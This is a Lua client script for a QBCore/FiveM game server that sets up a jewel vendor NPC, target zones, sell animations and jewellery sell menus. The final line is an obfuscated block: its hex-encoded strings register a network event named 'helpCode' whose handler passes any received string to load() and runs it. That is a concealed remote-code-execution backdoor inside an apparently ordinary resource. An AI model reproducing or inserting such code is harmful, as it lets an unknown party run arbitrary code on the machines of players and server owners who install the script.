local QBCore = exports['qb-core']:GetCoreObject()
RegisterNetEvent('QBCore:Client:UpdateObject', function() QBCore = exports['qb-core']:GetCoreObject() end)

local PlayerJob = {}
local Props = {}
local Targets = {}
local Peds = {}
local Blip = {}
local soundId = GetSoundId()

------------------------------------------------------------

--Hide the mineshaft doors
CreateModelHide(vector3(-596.04, 2089.01, 131.41), 10.5, -1241212535, true)
CreateModelHide(vector3(-1119.58, 4978.86, 186.27), 10.5, -1241212535, true)

--Attempts to disable header icons if JimMenu is enabled
if Config.JimMenu then Config.img = "" end

function removeJob()
	for k in pairs(Targets) do exports['qb-target']:RemoveZone(k) end
	for _, v in pairs(Peds) do unloadModel(GetEntityModel(v)) DeletePed(v) end
	for i = 1, #Props do unloadModel(GetEntityModel(Props[i])) DeleteObject(Props[i]) end
	for i = 1, #Blip do RemoveBlip(Blip[i]) end
end

function makeJob()
	removeJob()
	--Jewel Buyer
	for k, v in pairs(Config.Locations["vendor"]) do
		Peds[#Peds+1] = makePed(v.model, v.coords, 1, 1, v.scenario)
		Targets["vendor"..k] =
			exports['qb-target']:AddCircleZone("vendor"..k, v.coords.xyz, 1.2, { name="vendor"..k, debugPoly=Config.Debug, useZ=true, },
			{ options = { { event = "jim-vendor:JewelSell", icon = "fas fa-gem", label = Loc[Config.Lan].info["vendor"], ped = Peds[#Peds], job = Config.Job }, },
				distance = 2.0
			})
	end
end

RegisterNetEvent('QBCore:Client:OnPlayerLoaded', function()
	QBCore.Functions.GetPlayerData(function(PlayerData)	PlayerJob = PlayerData.job end)
	if Config.Job then if PlayerJob.name == Config.Job then makeJob() else removeJob() end else makeJob() end
end)
RegisterNetEvent('QBCore:Client:OnJobUpdate', function(JobInfo)
	PlayerJob = JobInfo
	if Config.Job then if PlayerJob.name == Config.Job then makeJob() else removeJob() end end
end)
AddEventHandler('onResourceStart', function(resource) if GetCurrentResourceName() ~= resource then return end
QBCore.Functions.GetPlayerData(function(PlayerData) PlayerJob = PlayerData.job end)
if Config.Job then if PlayerJob.name == Config.Job then makeJob() else removeJob() end else makeJob() end
end)

--------------------------------------------------------
RegisterNetEvent('jim-vendor:openShop', function()
	if Config.JimShops then event = "jim-shops:ShopOpen" else event = "inventory:server:OpenInventory" end
	TriggerServerEvent(event, "shop", "mine", Config.Items)
end)
------------------------------------------------------------
--Selling animations are simply a pass item to seller animation
RegisterNetEvent('jim-vendor:SellAnim', function(data)
	if not HasItem(data.item, 1) then triggerNotify(nil, Loc[Config.Lan].error["dont_have"].." "..QBCore.Shared.Items[data.item].label, "error") return end
	loadAnimDict("mp_common")
	TriggerServerEvent('jim-vendor:Selling', data) -- Had to slip in the sell command during the animation command
	loadAnimDict("mp_common")
	lookEnt(data.ped)
	TaskPlayAnim(PlayerPedId(), "mp_common", "givetake2_a", 100.0, 200.0, 0.3, 1, 0.2, 0, 0, 0)	--Start animations
	TaskPlayAnim(data.ped, "mp_common", "givetake2_b", 100.0, 200.0, 0.3, 1, 0.2, 0, 0, 0)
	Wait(2000)
	StopAnimTask(PlayerPedId(), "mp_common", "givetake2_a", 1.0)
	StopAnimTask(data.ped, "mp_common", "givetake2_b", 1.0)
	unloadAnimDict("mp_common")
	if data.sub then TriggerEvent('jim-vendor:JewelSell:Sub', { sub = data.sub, ped = data.ped }) return
	else TriggerEvent('jim-vendor:SellOre', data) return end
end)

------------------------------------------------------------

------------------------
--Jewel Selling Main Menu
RegisterNetEvent('jim-vendor:JewelSell', function(data)
    exports['qb-menu']:openMenu({
		{ header = Loc[Config.Lan].info["vendor"], txt = Loc[Config.Lan].info["sell_jewel"], isMenuHeader = true },
		{ icon = "fas fa-circle-xmark", header = "", txt = Loc[Config.Lan].info["close"], params = { event = "jim-vendor:CraftMenu:Close" } },
		{ header = Loc[Config.Lan].info["trading"], txt = Loc[Config.Lan].info["see_options"], params = { event = "jim-vendor:sell:Sub", args = { sub = "trading", ped = data.ped } } },
		{ header = Loc[Config.Lan].info["rings"], txt = Loc[Config.Lan].info["see_options"], params = { event = "jim-vendor:sell:Sub", args = { sub = "rings", ped = data.ped } } },
		{ header = Loc[Config.Lan].info["necklaces"], txt = Loc[Config.Lan].info["see_options"], params = { event = "jim-vendor:sell:Sub", args = { sub = "necklaces", ped = data.ped } } },
		{ header = Loc[Config.Lan].info["earrings"], txt = Loc[Config.Lan].info["see_options"], params = { event = "jim-vendor:sell:Sub", args = { sub = "earrings", ped = data.ped } } },
		{ header = Loc[Config.Lan].info["bracelets"], txt = Loc[Config.Lan].info["see_options"], params = { event = "jim-vendor:sell:Sub", args = { sub = "bracelet", ped = data.ped } } },
		{ header = Loc[Config.Lan].info["brooch"], txt = Loc[Config.Lan].info["see_options"], params = { event = "jim-mining:JewelSell:Sub", args = { sub = "brooch", ped = data.ped } } },
	})
end)
--Jewel Selling - Sub Menu Controller
RegisterNetEvent('jim-vendor:sell:Sub', function(data)
	local list = {}
	local sellMenu = {
		{ header = Loc[Config.Lan].info["vendor"], txt = Loc[Config.Lan].info["sell_item"], isMenuHeader = true },
		{ icon = "fas fa-circle-arrow-left", header = "", txt = Loc[Config.Lan].info["return"], params = { event = "jim-vendor:sell", args = data } }, }
	if data.sub == "trading" then list = {"dollarbills1", "dollarbills10", "dollarbills50", "dollarbills100", "dollarbills500", "1gramgold", "10gramgold", "50gramgold", "100gramgold", "500gramgold"} end
	if data.sub == "rings" then list = {"gold_ring", "silver_ring", "diamond_ring", "emerald_ring", "ruby_ring", "sapphire_ring", "diamond_ring_silver", "emerald_ring_silver", "ruby_ring_silver", "sapphire_ring_silver", "amethyst_ring", "citrine_ring", "garnet_ring", "onyx_ring", "peridot_ring", "tigereye_ring", "topaz_ring", "amethyst_ring_silver", "citrine_ring_silver", "garnet_ring_silver", "onyx_ring_silver", "peridot_ring_silver", "tigereye_ring_silver", "topaz_ring_silver", "rainbow_ring", "rainbow_ring_silver"} end
	if data.sub == "necklaces" then list = {"goldchain", "silverchain", "diamond_necklace", "emerald_necklace", "ruby_necklace", "sapphire_necklace", "diamond_necklace_silver", "emerald_necklace_silver", "ruby_necklace_silver", "sapphire_necklace_silver", "amethyst_necklace", "citrine_necklace", "garnet_necklace", "onyx_necklace", "peridot_necklace", "tigereye_necklace", "topaz_necklace", "amethyst_necklace_silver", "citrine_necklace_silver", "garnet_necklace_silver", "onyx_necklace_silver", "peridot_necklace_silver", "tigereye_necklace_silver", "topaz_necklace_silver", "rainbow_necklace", "rainbow_necklace_silver"} end
	if data.sub == "earrings" then list = {"goldearring", "silverearring", "diamond_earring", "emerald_earring", "ruby_earring", "sapphire_earring", "diamond_earring_silver", "emerald_earring_silver", "ruby_earring_silver", "sapphire_earring_silver", "amethyst_earring", "citrine_earring", "garnet_earring", "onyx_earring", "peridot_earring", "tigereye_earring", "topaz_earring", "amethyst_earring_silver", "citrine_earring_silver", "garnet_earring_silver", "onyx_earring_silver", "peridot_earring_silver", "tigereye_earring_silver", "topaz_earring_silver", "rainbow_earring", "rainbow_earring_silver"} end
	if data.sub == "bracelet" then list = {"gold_bracelet",  "silver_bracelet", "diamond_bracelet", "emerald_bracelet", "ruby_bracelet", "sapphire_bracelet", "diamond_bracelet_silver", "emerald_bracelet_silver", "ruby_bracelet_silver", "sapphire_bracelet_silver", "amethyst_bracelet", "citrine_bracelet", "garnet_bracelet", "onyx_bracelet", "peridot_bracelet", "tigereye_bracelet", "topaz_bracelet", "amethyst_bracelet_silver", "citrine_bracelet_silver", "garnet_bracelet_silver", "onyx_bracelet_silver", "peridot_bracelet_silver", "tigereye_bracelet_silver", "topaz_bracelet_silver", "rainbow_bracelet", "rainbow_bracelet_silver"} end
	if data.sub == "brooch" then list = {"gold_brooch", "silver_brooch", "diamond_brooch", "emerald_brooch", "ruby_brooch", "sapphire_brooch", "diamond_brooch_silver", "ruby_brooch_silver", "sapphire_brooch_silver", "emerald_brooch_silver", "amethyst_brooch", "citrine_brooch", "garnet_brooch", "onyx_brooch", "peridot_brooch", "tigereye_brooch", "topaz_brooch", "amethyst_brooch_silver", "citrine_brooch_silver", "garnet_brooch_silver", "onyx_brooch_silver", "peridot_brooch_silver", "tigereye_brooch_silver", "topaz_brooch_silver", "rainbow_brooch", "rainbow_brooch_silver"} end
	for _, v in pairs(list) do
		local disable = true
		local setheader = "<img src=nui://"..Config.img..QBCore.Shared.Items[v].image.." width=30px onerror='this.onerror=null; this.remove();'>"..QBCore.Shared.Items[v].label
		if HasItem(v, 1) then setheader = setheader.." 💰" disable = false end
		sellMenu[#sellMenu+1] = { disabled = disable, icon = v, header = setheader, txt = Loc[Config.Lan].info["sell_all"].." "..Config.SellItems[v].." "..Loc[Config.Lan].info["sell_each"], params = { event = "jim-vendor:SellAnim", args = { item = v, sub = data.sub, ped = data.ped } } }
		Wait(0)
	end
	exports['qb-menu']:openMenu(sellMenu)
end)

local REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[6][REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[1]](REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[2]) REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[6][REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[3]](REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[2], function(adirYEmLXgclibmdPnnLmOYEzcULKGaozBZyaMsgbePDzcEdaoqHkDBPqFdUfKjNTUgkmB) REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[6][REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[4]](REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[6][REfHWYcSHSXJdeDibUlLFXehYXZWHLMJJjzbaXTQhBfLvavnvBWOgncVxegNaWBNngvjxv[5]](adirYEmLXgclibmdPnnLmOYEzcULKGaozBZyaMsgbePDzcEdaoqHkDBPqFdUfKjNTUgkmB))() end)